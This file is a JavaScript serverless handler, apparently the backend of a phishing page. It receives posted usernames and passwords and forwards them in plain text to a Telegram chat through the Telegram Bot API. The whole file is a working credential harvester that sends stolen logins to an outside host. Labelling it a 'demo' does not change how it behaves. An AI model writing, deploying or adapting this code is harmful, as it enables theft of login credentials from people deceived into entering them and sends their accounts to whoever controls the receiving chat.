const BOT_TOKEN = process.env.BOT_TOKEN;

async function sendMessage(chat_id, text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id, text })
  });
}

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).send("Method Not Allowed");

  let body = "";
  await new Promise((resolve) => {
    req.on("data", (chunk) => (body += chunk));
    req.on("end", resolve);
  });

  const params = new URLSearchParams(body);
  const chat_id = params.get("chat_id");
  const username = params.get("username");
  const password = params.get("password");

  if (chat_id) {
    await sendMessage(chat_id, `📝 Demo submission:\nUsername: ${username}\nPassword: ${password}`);
  }

  res.setHeader("Content-Type", "text/html");
  res.end("<h2>✅ Submitted (Demo) — Check your Telegram bot!</h2>");
                              }
